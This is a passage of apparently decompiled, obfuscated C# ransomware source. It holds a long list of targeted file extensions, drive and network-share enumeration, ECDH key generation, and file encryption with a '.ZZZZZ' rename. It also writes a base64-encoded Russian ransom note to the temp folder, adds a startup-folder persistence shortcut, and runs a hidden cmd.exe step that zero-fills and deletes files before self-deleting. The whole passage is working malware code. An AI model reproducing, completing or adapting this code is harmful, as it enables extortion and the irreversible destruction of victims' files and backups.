					"ustar", "usx", "ut2", "ut3", "utc", "utd", "ute", "utf8", "uti", "utm",
					"uts", "utx", "uu", "uud", "uue", "uvf", "uvw", "uvx", "uwl", "uwrf",
					"uxx", "v", "v12", "v2i", "v2t", "val", "vaporcd", "vault", "vbadoc", "vbd",
					"vbk", "vbm", "vbox", "vbox-prev", "vbpf1", "vbs", "vbw", "VBX", "vc", "vc4",
					"vc6", "vc8", "vcal", "vcd", "vce", "vcf", "VCH", "vco", "vcp", "vcrd",
					"vcs", "vct", "vcx", "vdb", "vdf", "vdi", "vdo", "vdoc", "vdt", "vdx",
					"vec", "VER", "vf", "vfd", "vff", "vfs", "vfs0", "vhd", "vhdx", "vi",
					"vibe", "view", "vip", "vis", "viz", "vlc", "vle", "vlg", "vlt", "vmbx",
					"vmdk", "vmf", "vmg", "vmm", "vmsd", "vmsn", "vmss", "vmt", "vmwarevm", "vmx",
					"vmxf", "vob", "voi", "vok", "volarchive", "voprefs", "vor", "vp", "vpcbackup", "vpd",
					"vpk", "vpl", "vpol", "vpp", "vpp_pc", "vpx", "vrb", "vrd", "VRG", "vrp",
					"vs", "vsch", "vscontent", "vsd", "VSDIR", "vsdx", "vsf", "vsi", "vspolicy", "vssm",
					"vssx", "vst", "vstx", "vsv", "vsx", "vtf", "vthought", "vtv", "vtx", "vud",
					"vvf", "vvv", "vw", "vw3", "vxml", "vym", "vzm", "w", "w01", "w02",
					"W2B", "w2p", "w3g", "w3x", "w51", "w52", "w60", "w61", "w6bn", "w6w",
					"w8bn", "w8tn", "wab", "wac", "wad", "waff", "wallet", "walletx", "war", "wav",
					"wave", "waw", "wb", "wb1", "wb2", "wb3", "wbb", "wbcat", "WBF", "wbi",
					"wbk", "wbt", "wbxml", "wbz", "wcat", "wcd", "wcf", "wcl", "wcn", "wcp",
					"wcst", "wd0", "wd1", "wd2", "wd3", "wdb", "wdbn", "wdf", "wdgt", "wdl",
					"wdn", "wdoc", "wdq", "wdx9", "wea", "web", "webapp", "webdoc", "webpart", "wep",
					"WER", "wflx", "wfm", "wgt", "whf", "wht", "wid", "WIH", "wii", "wil",
					"wim", "win", "winclone", "wiz", "wjf", "wjr", "wk!", "wk1", "wk2", "wk3",
					"wk4", "wk5", "wkb", "wke", "wki", "wkl", "wks", "wlb", "wld", "wll",
					"wls", "wlx", "wlxml", "wlz", "wm", "wma", "wmd", "wmdb", "wmf", "wmga",
					"wmk", "wml", "wmlc", "wmmp", "wmo", "wms", "wmt", "wmv", "wmx", "wn",
					"wnk", "wolf", "word", "wordlist", "world", "wotreplay", "wow", "woz", "wp", "wp42",
					"wp5", "wp50", "wp6", "wp7", "wpa", "wpb", "wpc", "wpc2", "wpd", "wpd0",
					"wpd1", "wpd2", "wpd3", "wpe", "wpf", "wpk", "wpl", "wpo", "wpost", "wps",
					"wpt", "wpw", "wr1", "wrf", "wri", "wrk", "wrlk", "ws", "ws1", "ws2",
					"ws3", "ws4", "ws5", "ws6", "ws7", "WSB", "WSC", "wsd", "wsf", "wsh",
					"wsi", "wsm", "wsp", "wspak", "wtb", "wtbn", "wtd", "wtf", "wtml", "wtmp",
					"wtp", "wtr", "wts", "wtt", "wtx", "wud", "wvp", "wvw", "wvx", "wwcx",
					"WWD", "wwi", "wwl", "wws", "wwt", "wx", "wxmx", "wxp", "wyn", "wzn",
					"wzs", "x11", "x16", "x3f", "x3g", "x64", "xa", "xaf", "xaiml", "XAML",
					"xamlx", "xappl", "xar", "xas", "xav", "xbc", "xbd", "XBF", "xbk", "xbrl",
					"xbt", "xci", "xcsl", "xda", "xdb", "xdc", "xdf", "xdi", "xdna", "xdo",
					"xdoc", "xdp", "xds", "xdw", "xef", "xem", "xer", "xf", "xfd", "xfdf",
					"xfi", "xfl", "xflow", "xfn", "xfo", "xfp", "xfr", "xft", "xfx", "xgml",
					"xgmml", "xgp", "xht", "xhtm", "xhtml", "xif", "xig", "XIN", "xis", "xjf",
					"xl", "xla", "xlam", "xlb", "xlc", "xld", "xle", "xlf", "xlgc", "xliff",
					"xline", "xlist", "xlk", "xll", "xlm", "xlnk", "xlr", "xls", "xlsb", "xlse",
					"xlshtml", "xlsl", "xlsm", "xlst", "xlsx", "xlsxl", "xlt", "xlthtml", "xltm", "xltx",
					"xlv", "xlw", "xlwx", "xma", "xmap", "xmcd", "xmct", "xmd", "xmdf", "xmf",
					"xmi", "xmind", "xml", "xmlff", "xmlper", "xmmap", "xmn", "xmp", "xmpz", "xms",
					"xmt_bin", "xmta", "xmwx", "xmzx", "XPB", "xpd", "xpdl", "xpg", "xpi", "xpj",
					"xpll", "xpm", "xpr", "xps", "xpse", "xpt", "xpwe", "xqm", "xqr", "xqx",
					"xrb", "xrdml", "xrff", "xrp", "xry", "xsc", "xsd", "xsf", "xsig", "xsl",
					"xslt", "xsvf", "XSX", "xtbl", "xtd", "xtg", "xtm", "xtml", "xtp", "xtps",
					"xtrl", "xum", "xv0", "xv2", "xv3", "xva", "xvct", "xvd", "xvg", "xvid",
					"xvl", "xwd", "xweb3htm", "xweb3html", "xweb4stm", "xweb4xml", "xwf", "xwp", "xxd", "xxe",
					"xxx", "xy", "xy3", "xy4v", "xyd", "xyz", "xyzv", "yab", "yam", "ycbcra",
					"ychat", "yenc", "YES", "ygf", "yka", "yml", "ync", "yps", "yrcbck", "yrcbkm",
					"yrcdat", "yumtx", "yuv", "z02", "z04", "zap", "zbfx", "zdb", "zdc", "zdct",
					"ZFSENDTOTARGET", "zim", "zip", "zipx", "zix", "zma", "zmc", "zoo", "zpl", "zps",
					"ztmp", "ert", "efd", "biz", "CDX", "SQL", "DD", "MD", "MDF", "LOG",
					"DB", "BD", "LOG", "cfu", "DAT", "DBF", "DBX", "SDF", "BACK", "BACKUP",
					"BAC", "AWB", "DMP", "SAV", "TIB", "VBK", "VRB", "WBB", "TRN", "TIS",
					"ZIP", "RAR", "SQL", "BAK", "DCX", "DBC", "DBX", "DCT", "XLS", "XLSX",
					"DOC", "DOCX", "FPT", "LDF", "NDF", "$ER", "4DD", "4DL", "ACCDB", "ACCDC",
					"ACCDE", "ACCDR", "ACCDT", "ACCFT", "ADB", "ADB", "ADE", "ADF", "ADP", "ALF",
					"ASK", "BTR", "CAT", "CDB", "CDB", "CDB", "CKP", "CMA", "CPD", "CRYPT12",
					"CRYPT8", "CRYPT9", "DACPAC", "DAD", "DADIAGRAMS", "DASCHEMA", "DB", "DB", "DB-SHM", "DB-WAL",
					"DBCRYPT12", "DBCRYPT8", "DB3", "DBC", "DBF", "DBS", "DBT", "DBV", "DBX", "DCB",
					"DCT", "DCX", "DDL", "DLIS", "DP1", "DQY", "DSK", "DSN", "DTSX", "DXL",
					"ECO", "ECX", "EDB", "EDB", "EPIM", "EXB", "FCD", "FDB", "FDB", "FIC",
					"FMP", "FMP12", "FMPSL", "FOL", "FP3", "FP4", "FP5", "FP7", "FPT", "FRM",
					"GDB", "GDB", "GRDB", "GWI", "HDB", "HIS", "IB", "IDB", "IHX", "ITDB",
					"ITW", "JET", "JTX", "KDB", "KEXI", "KEXIC", "KEXIS", "LGC", "LWX", "MAF",
					"MAQ", "MAR", "MARSHAL", "MAS", "MAV", "MDB", "MDF", "MPD", "MRG", "MUD",
					"MWB", "MYD", "NDF", "NNT", "NRMLIB", "NS2", "NS3", "NS4", "NSF", "NV",
					"NV2", "NWDB", "NYF", "ODB", "ODB", "OQY", "ORA", "ORX", "OWC", "P96",
					"P97", "PAN", "PDB", "PDB", "PDM", "PNZ", "QRY", "QVD", "RBF", "RCTD",
					"ROD", "ROD", "RODX", "RPD", "RSD", "SAS7BDAT", "SBF", "SCX", "SDB", "SDB",
					"SDB", "SDB", "SDC", "SDF", "SIS", "SPQ", "SQL", "SQLITE", "SQLITE3", "SQLITEDB",
					"TE", "TEACHER", "TEMX", "TMD", "TPS", "TRC", "TRC", "TRM", "UDB", "UDL",
					"USR", "V12", "VIS", "VPD", "VVV", "WDB", "WMDB", "WRK", "XDB", "XLD",
					"XMLFF", "vmrs", "VMSC", "VMRS", "3me", "3pe", "hif", "iif", "lyt", "nd",
					"qb2005", "qb2006", "qb2007", "qb2009", "qb2010", "qbb", "qbm", "qbmb", "qbo", "qbw",
					"qbx", "qdf", "qel", "qfx", "qpb", "qsd", "tax", "tax08", "tax09", "tax10",
					"tax11", "tax2008", "tax2009", "tax2010", "tax2011", "tlg", "tt11", "qb2011", "qb2012", "imt",
					"3ME", "3PE", "HIF", "IIF", "LYT", "ND", "QB2005", "QB2006", "QB2007", "QB2009",
					"QB2010", "QBB", "QBM", "QBMB", "QBO", "QBW", "QBX", "QDF", "QEL", "QFX",
					"QPB", "QSD", "TAX", "TAX08", "TAX09", "TAX10", "TAX11", "TAX2008", "TAX2009", "TAX2010",
					"TAX2011", "TLG", "TT11", "QB2011", "QB2012", "IMT", "VHDX", "VHD", "lxa", "LXA",
					"AVHD", "AVHDX", "OVA", "BKF", "altrdf", "ALTRDF", "altc", "alttr", "bck", "TIBX",
					"tibx", "ARC", "fina"
				}, ".ZZZZZ", new string[0], rtATyKSVirO);
			});
			thread.Priority = ThreadPriority.Normal;
			thread.IsBackground = false;
			thread.Start();
		}
		catch
		{
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string mnwTSbUDiUuOc, int PGPAQvOzXtqTsJD, IntPtr ybazGDrzQKmNAuq, ref int nIqLNImGBAsx);

	private static string OpJFaZlDRfwUj(string hQBRIHNqMtmOr, int SBrEuSZwNAB = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(SBrEuSZwNAB);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(hQBRIHNqMtmOr, 1, intPtr, ref SBrEuSZwNAB) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static string IsmQQjicQbUM(byte[] nPzgwsryJtBxe)
	{
		return Convert.ToBase64String(nPzgwsryJtBxe);
	}

	public static byte[] QEwGnMMixZzfeOT(string JNWCKwGtQF)
	{
		return Convert.FromBase64String(JNWCKwGtQF);
	}

	public static void oQXjkbABgIM()
	{
		using ECDiffieHellmanCng eCDiffieHellmanCng = new ECDiffieHellmanCng(CngKey.Create(CngAlgorithm.ECDiffieHellmanP521, null, new CngKeyCreationParameters
		{
			ExportPolicy = CngExportPolicies.AllowPlaintextExport
		}));
		eCDiffieHellmanCng.KeyDerivationFunction = ECDiffieHellmanKeyDerivationFunction.Hash;
		eCDiffieHellmanCng.HashAlgorithm = CngAlgorithm.Sha256;
		iZDhoDCXicua = eCDiffieHellmanCng.Key.Export(CngKeyBlobFormat.EccPrivateBlob);
		tRfebFlORRrk = eCDiffieHellmanCng.PublicKey.ToByteArray();
	}

	public static byte[] kmNoKFvTArlU(byte[] usyzYmJjZEmRNZEF, byte[] gDLVEhddjN)
	{
		using ECDiffieHellmanCng eCDiffieHellmanCng = new ECDiffieHellmanCng(CngKey.Import(usyzYmJjZEmRNZEF, CngKeyBlobFormat.EccPrivateBlob));
		eCDiffieHellmanCng.KeyDerivationFunction = ECDiffieHellmanKeyDerivationFunction.Hash;
		eCDiffieHellmanCng.HashAlgorithm = CngAlgorithm.Sha256;
		return eCDiffieHellmanCng.DeriveKeyMaterial(CngKey.Import(gDLVEhddjN, CngKeyBlobFormat.EccPublicBlob));
	}

	public static void pQsIRxMQfXRA()
	{
		xQfMOPCvvVAqwp("cmd.exe", joRKfFeYni("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = joRKfFeYni("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void SUdHgdcEVqPlo(string rTCCyfQvvlxjNkbX)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(rTCCyfQvvlxjNkbX);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(rTCCyfQvvlxjNkbX, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(rTCCyfQvvlxjNkbX);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(rTCCyfQvvlxjNkbX, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (nOaztTOGmlogd)
			{
				try
				{
					File.AppendAllText(zRTqZqtXid, "File: " + rTCCyfQvvlxjNkbX + " - Error while removing readonly attribute: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string LmZNugIjEba()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = "";
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = "Me";
				break;
			case 10:
				text = ((!(version.Revision.ToString() == "2222A")) ? "98" : "98SE");
				break;
			case 0:
				text = "95";
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = "NT 3.51";
				break;
			case 4:
				text = "NT 4.0";
				break;
			case 5:
				text = ((version.Minor != 0) ? "XP" : "2000");
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? "8.1" : "8") : "7") : "Vista");
				break;
			case 10:
				text = "10";
				break;
			}
		}
		if (text != "")
		{
			text = "Windows " + text;
			if (oSVersion.ServicePack != "")
			{
				text = text + " " + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string pdCeuoZqBlC(string kwCvNqDtQqnKhl)
	{
		string text = Path.GetTempPath() + "\\Инструкция.txt";
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(joRKfFeYni("0JLQsNGI0Lgg0LTQvtC60YPQvNC10L3RgtGLLCDQsdCw0LfRiyDQtNCw0L3QvdGL0YUg0Lgg0LTRgNGD0LPQuNC1INGE0LDQudC70Ysg0LHRi9C70Lgg0LfQsNGI0LjRhNGA0L7QstCw0L3Riy4g0J3QviDQvdC1INGB0YLQvtC40YIg0L/QtdGA0LXQttC40LLQsNGC0YwhIA0K0JzRiyDQstGB0LUg0YDQsNGB0YjQuNGE0YDRg9C10Lwg0Lgg0LLQtdGA0L3QtdC8INC90LAg0YHQstC+0Lgg0LzQtdGB0YLQsC4NCg0K0JTQu9GPINGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0LTQsNC90L3Ri9GFOg0KDQrQndCw0L/QuNGI0LjRgtC1INC90LAg0L/QvtGH0YLRgyAtIHNlY3VyZTQzNTNAbXNnc2FmZS5pbw0KIA0KICrQkiDQv9C40YHRjNC80LUg0YPQutCw0LfQsNGC0Ywg0JLQsNGIINC70LjRh9C90YvQuSDQuNC00LXQvdGC0LjRhNC40LrQsNGC0L7RgCAoS2V5IElkZW50aWZpZXIpDQogKtCf0YDQuNC60YDQtdC/0LjRgtC1IDIg0YTQsNC50LvQsCDQtNC+IDIg0LzQsSDQtNC70Y8g0YLQtdGB0YLQvtCy0L7QuSDRgNCw0YHRiNC40YTRgNC+0LLQutC4LiANCiAg0LzRiyDQuNGFINGA0LDRgdGI0LjRhNGA0YPQtdC8LCDQsiDQutCw0YfQtdGB0YLQstC1INC00L7QutCw0LfQsNGC0LXQu9GM0YHRgtCy0LAsINGH0YLQviDQotCe0JvQrNCa0J4g0JzQqyDQvNC+0LbQtdC8INGA0LDRgdGI0LjRhNGA0L7QstCw0YLRjCDRhNCw0LnQu9GLLg0KDQogLdCn0LXQvCDQsdGL0YHRgtGA0LXQtSDQstGLINGB0L7QvtCx0YnQuNGC0LUg0L3QsNC8INGB0LLQvtC5INC40LTQtdC90YLQuNGE0LjQutCw0YLQvtGALCDRgtC10Lwg0LHRi9GB0YLRgNC10LUg0LzRiyDQstGL0LrQu9GO0YfQuNC8INC/0YDQvtC40LfQstC+0LvRjNC90L7QtSDRg9C00LDQu9C10L3QuNC1INGE0LDQudC70L7Qsi4NCiAt0J3QsNC/0LjRgdCw0LIg0L3QsNC8INC90LAg0L/QvtGH0YLRgyDQstGLINC/0L7Qu9GD0YfQuNGC0LUg0LTQsNC70YzQvdC10LnRiNC40LUg0LjQvdGB0YLRgNGD0LrRhtC40Lgg0L/QviDQvtC/0LvQsNGC0LUuDQoNCtCSINC+0YLQstC10YLQvdC+0Lwg0L/QuNGB0YzQvNC1INCS0Ysg0L/QvtC70YPRh9C40YLQtSDQv9GA0L7Qs9GA0LDQvNC80YMg0LTQu9GPINGA0LDRgdGI0LjRhNGA0L7QstC60LguDQrQn9C+0YHQu9C1INC30LDQv9GD0YHQutCwINC/0YDQvtCz0YDQsNC80LzRiy3QtNC10YjQuNGE0YDQvtCy0YnQuNC60LAg0LLRgdC1INCS0LDRiNC4INGE0LDQudC70Ysg0LHRg9C00YPRgiDQstC+0YHRgdGC0LDQvdC+0LLQu9C10L3Riy4NCg0K0JzRiyDQs9Cw0YDQsNC90YLQuNGA0YPQtdC8Og0KMTAwJSDRg9GB0L/QtdGI0L3QvtC1INCy0L7RgdGB0YLQsNC90L7QstC70LXQvdC40LUg0LLRgdC10YUg0LLQsNGI0LjRhSDRhNCw0LnQu9C+0LINCjEwMCUg0LPQsNGA0LDQvdGC0LjRjiDRgdC+0L7RgtCy0LXRgtGB0YLQstC40Y8NCjEwMCUg0LHQtdC30L7Qv9Cw0YHQvdGL0Lkg0Lgg0L3QsNC00LXQttC90YvQuSDRgdC10YDQstC40YENCtCS0L3QuNC80LDQvdC40LUhDQogKiDQndC1INC/0YvRgtCw0LnRgtC10YHRjCDRg9C00LDQu9C40YLRjCDQv9GA0L7Qs9GA0LDQvNC80YMg0LjQu9C4INC30LDQv9GD0YHQutCw0YLRjCDQsNC90YLQuNCy0LjRgNGD0YHQvdGL0LUg0YHRgNC10LTRgdGC0LLQsA0KICog0J/QvtC/0YvRgtC60Lgg0YHQsNC80L7RgdGC0L7Rj9GC0LXQu9GM0L3QvtC5INGA0LDRgdGI0LjRhNGA0L7QstC60Lgg0YTQsNC50LvQvtCyINC/0YDQuNCy0LXQtNGD0YIg0Log0L/QvtGC0LXRgNC1INCS0LDRiNC40YUg0LTQsNC90L3Ri9GFDQogKiDQlNC10YjQuNGE0YDQsNGC0L7RgNGLINC00YDRg9Cz0LjRhSDQv9C+0LvRjNC30L7QstCw0YLQtdC70LXQuSDQvdC10YHQvtCy0LzQtdGB0YLQuNC80Ysg0YEg0JLQsNGI0LjQvNC4INC00LDQvdC90YvQvNC4LCDRgtCw0Log0LrQsNC6INGDINC60LDQttC00L7Qs9C+INC/0L7Qu9GM0LfQvtCy0LDRgtC10LvRjw0K0YPQvdC40LrQsNC70YzQvdGL0Lkg0LrQu9GO0Ycg0YjQuNGE0YDQvtCy0LDQvdC40Y8NCg0KDQrQmtCw0LbQtNGL0LUgMjQg0YfQsNGB0LAg0YPQtNCw0LvRj9GO0YLRgdGPIDI0INGE0LDQudC70LAsINC90LXQvtCx0YXQvtC00LjQvNC+INC/0YDQuNGB0LvQsNGC0Ywg0YHQstC+0Lkg0LjQtNC10L3RgtC40YTQuNC60LDRgtC+0YAg0YfRgtC+0LEg0LzRiyDQvtGC0LrQu9GO0YfQuNC70Lgg0Y3RgtGDINGE0YPQvdC60YbQuNGOLg0K0JrQsNC20LTRi9C1IDI0INGH0LDRgdCwINGB0YLQvtC40LzQvtGB0YLRjCDRgNCw0YHRiNC40YTRgNC+0LLQutC4INC00LDQvdC90YvRhSDRg9Cy0LXQu9C40YfQuNCy0LDQtdGC0YHRjyDQvdCwIDMwJSAo0YfQtdGA0LXQtyA3MiDRh9Cw0YHQsCDRgdGD0LzQvNCwINGE0LjQutGB0LjRgNGD0LXRgtGB0Y8p"));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(joRKfFeYni("S0VZSUQ6IA=="));
				streamWriter.WriteLine(kwCvNqDtQqnKhl);
				if (FDgJvwVvfGwgSO)
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(joRKfFeYni("UEMgSGFyZHdhcmUgSUQ6IA=="));
					streamWriter.WriteLine(tbTGHSHczYFiA.eRjoPReHvhw());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(kwCvNqDtQqnKhl) && !zzEQfIIuvgiBbM)
				{
					File.AppendAllText(text, "\r\nAdditional KeyId:\r\n" + kwCvNqDtQqnKhl);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (nOaztTOGmlogd)
			{
				try
				{
					File.AppendAllText(zRTqZqtXid, "Error while writing Temp Folder Report: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
		}
		return text;
	}

	public static void LJqehIMLUBjsXL(string zcJwpSpCbhTgU, string EdehGFrPEKIWMlS)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + zcJwpSpCbhTgU + ".url");
		streamWriter.WriteLine("[Summary]");
		streamWriter.WriteLine("URL=file:///" + EdehGFrPEKIWMlS);
		streamWriter.WriteLine("IconIndex=0");
		string text = EdehGFrPEKIWMlS.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
	}

	private static void jufpjgujiaoBdHm(string[] asvlQRfoFjtlWG, string[] ipTbdjmzgN, string[] wpskCiRAWhmH, string TNfJKGLzQaPjaqz, string rAXiYNfxjYpKOg)
	{
		if (bAJKJVOJOLbMhb && !LmZNugIjEba().Contains("XP") && !LmZNugIjEba().Contains("Windows 7"))
		{
			aTEqIOEEssdEJGA.ODwEoAVGhnn();
		}
		SJplwSfijrqqcbsF = Convert.FromBase64String(TNfJKGLzQaPjaqz);
		DriveInfo[] array = null;
		if (asvlQRfoFjtlWG[0] == "[auto]")
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = OpJFaZlDRfwUj(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !vNjCRxJChaZG.Contains(text))
							{
								vNjCRxJChaZG.Add(text);
							}
							else if (!vNjCRxJChaZG.Contains(array[i].Name))
							{
								vNjCRxJChaZG.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!vNjCRxJChaZG.Contains(array[i].Name))
							{
								vNjCRxJChaZG.Add(array[i].Name);
							}
						}
					}
					else if (!vNjCRxJChaZG.Contains(array[i].Name))
					{
						vNjCRxJChaZG.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int i = 0; i < asvlQRfoFjtlWG.Length; i++)
			{
				if (!vNjCRxJChaZG.Contains(asvlQRfoFjtlWG[i]))
				{
					vNjCRxJChaZG.Add(asvlQRfoFjtlWG[i]);
				}
			}
		}
		if (vNjCRxJChaZG.Contains(joRKfFeYni("Qzpc")) && gfQBPZXmtxR == "YES")
		{
			vNjCRxJChaZG.Remove(joRKfFeYni("Qzpc"));
		}
		if (YNeLFQebpndLj == "YES")
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				qJkIvMmFjkX.EZzZovZbVz();
			});
			thread.IsBackground = true;
			thread.Priority = ThreadPriority.Normal;
			thread.Start();
		}
		Parallel.ForEach(vNjCRxJChaZG, delegate(string t)
		{
			if (lAAXflzcqhB && !LmZNugIjEba().Contains("XP") && !LmZNugIjEba().Contains("Windows 7"))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						vYdUiwPtSnKrD(WindowsIdentity.GetCurrent().Name, t);
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			if (BHjDxJUUfXETE == "YES")
			{
				Thread thread3 = new Thread((ThreadStart)delegate
				{
					eGTKDDPKaFeGW(t, ipTbdjmzgN, rAXiYNfxjYpKOg, wpskCiRAWhmH, TNfJKGLzQaPjaqz);
				});
				thread3.Priority = ThreadPriority.Normal;
				thread3.IsBackground = false;
				thread3.Start();
				thread3.Join();
			}
			else
			{
				eGTKDDPKaFeGW(t, ipTbdjmzgN, rAXiYNfxjYpKOg, wpskCiRAWhmH, TNfJKGLzQaPjaqz);
			}
		});
	}

	public static void eGTKDDPKaFeGW(string kNtuaxaWcIMwvd, string[] lHsaydeQzdyVLkQEO, string anrJpBlUNBM, string[] zofyZHsRormExXXBu, string droeyaoJBkn)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add("");
		List<string> list3 = list2;
		if (KAWZebQNpMVlGZo == "NO")
		{
			if (VqCooiuVqHTq == "YES" && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && ypMxZjBCXBTR(kNtuaxaWcIMwvd))
			{
				anEOIYMImR anEOIYMImR = null;
				try
				{
					anEOIYMImR = new anEOIYMImR(kNtuaxaWcIMwvd.Replace("\\", ""));
				}
				catch
				{
					list = JDlAMHFGKK(kNtuaxaWcIMwvd, lHsaydeQzdyVLkQEO, anrJpBlUNBM, zofyZHsRormExXXBu, droeyaoJBkn);
					return;
				}
				try
				{
					ZfnXaJgDOJx(anEOIYMImR.ToArray().ToList(), lHsaydeQzdyVLkQEO, anrJpBlUNBM, zofyZHsRormExXXBu, droeyaoJBkn);
					return;
				}
				catch (Exception)
				{
					list = JDlAMHFGKK(kNtuaxaWcIMwvd, lHsaydeQzdyVLkQEO, anrJpBlUNBM, zofyZHsRormExXXBu, droeyaoJBkn);
					return;
				}
			}
			list = JDlAMHFGKK(kNtuaxaWcIMwvd, lHsaydeQzdyVLkQEO, anrJpBlUNBM, zofyZHsRormExXXBu, droeyaoJBkn);
			return;
		}
		list = ySVlKjOBHeCSRx.SearchFiles(kNtuaxaWcIMwvd);
		foreach (string text in lHsaydeQzdyVLkQEO)
		{
			foreach (string item in list)
			{
				if (zofyZHsRormExXXBu.Length != 0)
				{
					int num = 0;
					while (num < zofyZHsRormExXXBu.Length)
					{
						string value = zofyZHsRormExXXBu[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_03ca;
					}
				}
				if ((LPoVZAteiiRKPJ == "NO" && !item.EndsWith(text)) || NnFouaTmgntTWt.Contains(item))
				{
					continue;
				}
				if (LitDbhWzmovijj == "YES")
				{
					try
					{
						if (fbDAqJbVdGX.muSdOUxGcrOy(item))
						{
							fbDAqJbVdGX.yDSXoshfrbq(item);
						}
					}
					catch
					{
					}
				}
				NnFouaTmgntTWt.Add(item);
				if (!jjfntRYhuFNxp.Contains(Path.GetDirectoryName(item)))
				{
					jjfntRYhuFNxp.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (VPAHoMRqycZH == "YES" && fileStream.Length > Convert.ToInt32(oIPxacaZFPrUD) * 1024 * 1024 && !list3.Contains(text))
					{
						if (zZHWpuVxsPg == "YES")
						{
							foreach (string item2 in CaWnKQHcaGrIr)
							{
								if (item.ToLower().EndsWith(item2) && CxqzogRLMjBXRE == "YES")
								{
									if (Convert.ToInt32(ChPvsDcZDKEbb) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && CxqzogRLMjBXRE == "NO")
								{
									try
									{
										tbTGHSHczYFiA.notwODHLHfYFV("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] dyzppzJJArxkj = LPxPUxFbwbiz.IXQbjATPSfee(item, Convert.ToInt32(oIPxacaZFPrUD) * 1024 * 1024);
						byte[] qsGNXaukFrpn = LPxPUxFbwbiz.DJqnxaACLqbwV(dyzppzJJArxkj, Convert.FromBase64String(droeyaoJBkn), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						LPxPUxFbwbiz.vNGqufskYtzV(item, qsGNXaukFrpn);
						if (anrJpBlUNBM != ".*")
						{
							File.Move(item, item + anrJpBlUNBM);
						}
					}
					else if (anrJpBlUNBM != ".*")
					{
						MdZIuCixlcSgzc(item, item + anrJpBlUNBM, SJplwSfijrqqcbsF);
					}
					else
					{
						MdZIuCixlcSgzc(item, item + ".part", SJplwSfijrqqcbsF);
					}
				}
				catch (Exception)
				{
				}
				IL_03ca:;
			}
		}
	}

	public static void ZfnXaJgDOJx(List<string> DrqHUPaEXI, string[] kWsOOJXlgNhgCq, string VDYusVfjQzojYiVO, string[] ymmuLygdSdVjre, string YuRsJqNWUQJzxx)
	{
		List<string> CeGwqiGcZtQOavm = new List<string> { "" };
		if (LPoVZAteiiRKPJ == "NO")
		{
			string dQotRvOnqv;
